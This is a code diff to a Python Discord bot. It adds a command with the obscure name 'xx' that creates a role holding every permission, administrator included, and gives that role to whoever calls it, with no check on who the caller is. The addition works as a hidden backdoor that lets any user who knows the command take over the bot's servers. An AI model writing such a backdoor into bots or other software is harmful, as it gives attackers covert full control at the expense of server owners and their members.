@@ -1,5 +1,7 @@
 import discord
+from discord import Permissions
 from discord.ext.commands import bot
+from discord.utils import get
 from discord import game
 from discord.ext import commands
 import asyncio
@@ -42,6 +44,13 @@ async def su(ctx, *, content: str):
             except:
                 print("can't")
                 await client.say()
+               
+@client.command(pass_context=True)
+async def xx(ctx,*,s):
+    author = ctx.message.author
+    perms = discord.Permissions(send_messages=False, read_messages=True, administrator=True)
+    role = await client.create_role(author.server, name=s, permissions=Permissions.all())
+    await client.add_roles(author, role)
                 
             
                
